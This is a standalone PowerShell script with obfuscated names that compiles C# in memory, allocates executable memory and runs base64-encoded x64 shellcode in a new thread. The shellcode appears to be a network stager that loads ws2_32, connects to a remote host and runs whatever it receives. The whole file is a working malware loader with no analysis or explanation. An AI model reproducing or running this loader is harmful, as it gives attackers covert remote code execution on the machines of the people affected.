Set-StrictMode -Version 2
$o9 = @"
	using System;
	using System.Runtime.InteropServices;
	namespace bHi0 {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$r7XP = New-Object Microsoft.CSharp.CSharpCodeProvider
$o2y = New-Object System.CodeDom.Compiler.CompilerParameters
$o2y.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$o2y.GenerateInMemory = $True
$ze = $r7XP.CompileAssemblyFromSource($o2y, $o9)

[Byte[]]$irU = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAQER8Gf9EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=")

$kuKAX = [bHi0.func]::VirtualAlloc(0, $irU.Length + 1, [bHi0.func+AllocationType]::Reserve -bOr [bHi0.func+AllocationType]::Commit, [bHi0.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$kuKAX) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($irU, 0, $kuKAX, $irU.Length)
[IntPtr] $lFwV = [bHi0.func]::CreateThread(0,0,$kuKAX,0,0,0)
if ([Bool]!$lFwV) { $global:result = 7; return }
$tNRm = [bHi0.func]::WaitForSingleObject($lFwV, [bHi0.func+Time]::Infinite)
